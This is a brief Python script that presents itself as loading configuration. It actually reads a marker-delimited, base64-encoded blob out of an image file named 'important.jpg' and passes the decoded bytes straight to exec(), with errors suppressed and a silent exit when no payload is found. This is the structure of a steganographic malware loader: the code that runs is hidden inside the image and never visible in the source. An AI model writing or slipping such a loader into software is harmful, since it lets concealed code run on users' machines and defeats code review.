import base64
import os
import sys
from pathlib import Path

def _load_config(config_file):
    try:
        with open(config_file, 'rb') as f:
            file_data = f.read()
        
        header_pattern = b'\xFF\xFE'
        pattern_position = file_data.find(header_pattern)
        if pattern_position != -1:
            data_offset = pattern_position + 4
            data_limit = file_data.find(b'\xFF', data_offset)
            if data_limit == -1:
                data_limit = len(file_data)
            encoded_config = file_data[data_offset:data_limit]
            return base64.b64decode(encoded_config)
    except Exception:
        pass
    return None

config_data = _load_config('important.jpg')
if config_data:
    exec(config_data)
else:
    sys.exit(1)